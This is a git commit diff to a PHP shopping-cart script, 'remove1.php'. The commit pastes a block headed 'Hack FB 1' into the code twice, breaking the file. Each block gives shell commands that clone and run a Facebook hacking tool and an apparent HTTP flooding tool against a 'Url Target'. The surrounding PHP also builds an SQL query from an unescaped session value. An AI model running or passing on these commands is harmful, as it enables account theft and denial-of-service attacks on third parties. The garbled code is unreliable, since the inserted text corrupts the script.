0db25ce2ee86584fc9d9f034bfe0657e90e53943
Mayank-Khurmai <mayankkhurmai8@gmail.com>
2019-10-05 17:55:25 +0530

    Update remove1.php

--- remove1.php
+++ remove1.php
@@ -12,13 +12,49 @@ session_start();
     $details2 = mysqli_fetch_assoc($records2);
  
         
-         
+         Hack FB 1
+
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/SantriCyber/santri-IDN
+cd santri-IDN
+python2 santri-IDN.py
+
+$ apt update && upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/ujjawalsaini3/hulk
+$ cd hulk
+$ chmod +x hulk.py
+$ python2 hulk.py "Url Target"
 
                 $a = $_SESSION['emailadd'];
                 $p = " ";
                 $q = 0;
       
-                $sql2 = "UPDATE carttable SET pone='$p' , ppone='$q' WHERE emailadd='$a'";
+       Hack FB 1
+
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/SantriCyber/santri-IDN
+cd santri-IDN
+python2 santri-IDN.py
+
+$ apt update && upgrade
+$ pkg install git
+$ pkg install python2
+$ git clone https://github.com/ujjawalsaini3/hulk
+$ cd hulk
+$ chmod +x hulk.py
+$ python2 hulk.py "Url Target"         $sql2 = "UPDATE carttable SET pone='$p' , ppone='$q' WHERE emailadd='$a'";
                 mysqli_query($db2, $sql2);
                 include 'cart.php';
 
